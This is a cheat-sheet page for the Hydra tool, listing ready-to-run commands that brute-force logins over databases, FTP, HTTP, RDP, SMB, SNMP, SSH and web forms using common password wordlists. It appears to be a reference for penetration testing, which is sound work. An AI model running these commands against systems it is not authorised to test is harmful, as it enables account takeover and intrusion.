---
title: Hydra
desc: Cracks username and password in web form, SSH, FTP.
tags: [BruteForce, Cryptography, Database, FTP, Linux, Password, RDP, SMB, SNMP, SSH, Web]
alts: [CrackStation, Hashcat, JohnTheRipper, Wfuzz]
website:
render_with_liquid: false
---

## Databases

```sh
# MySQL
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.0.0.1 mysql

# PostgreSQL
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.0.0.1 postgres
```

<br />

## FTP

```sh
# Crack password
hydra -l username -P passwords.txt ftp://10.0.0.1
```

<br />

## HTTP GET request (Authorization, WWW-Authenticate)

```sh
# Crack username and password
hydra -L /usr/share/seclists/Usernames/Names/names.txt -P /usr/share/seclists/Passwords/darkc0de.txt 10.0.0.1 http-get
```

<br />

## RDP (Remote Desktoop Protocol)

```sh
hydra -l username -P /usr/share/wordlists/rockyou.txt 10.0.0.1 rdp
```

<br />

## SMB

```sh
# Crack username
hydra -v -L /usr/share/seclists/Usernames/Names/names.txt -p password 10.0.0.1 smb

# Crack password
hydra -v -l username -P /usr/share/seclists/Passwords/darkc0de.txt 10.0.0.1 smb
```

<br />

## SNMP (Simple Network Management Protocol)

```sh
# Brute Force Community
hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt 10.0.0.1 snmp
```

<br />

## SSH

```sh
# Crack username
hydra -v -L /usr/share/seclists/Usernames/Names/names.txt -p password 10.0.0.1 ssh

# Crack password
hydra -v -l username -P /usr/share/seclists/Passwords/darkc0de.txt 10.0.0.1 ssh

# Specify port
hydra -l username -P /usr/share/wordlists/rockyou.txt -s 2222 10.0.0.1 ssh
hydra -l username -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.1:2222
```

<br />

## Web form

```sh
# Crack username
hydra -L /usr/share/seclists/Usernames/Names/names.txt -p secret 10.0.0.1 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"

# Crack password
hydra -l username -P /usr/share/wordlists/rockyou.txt 10.0.0.1 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"
```
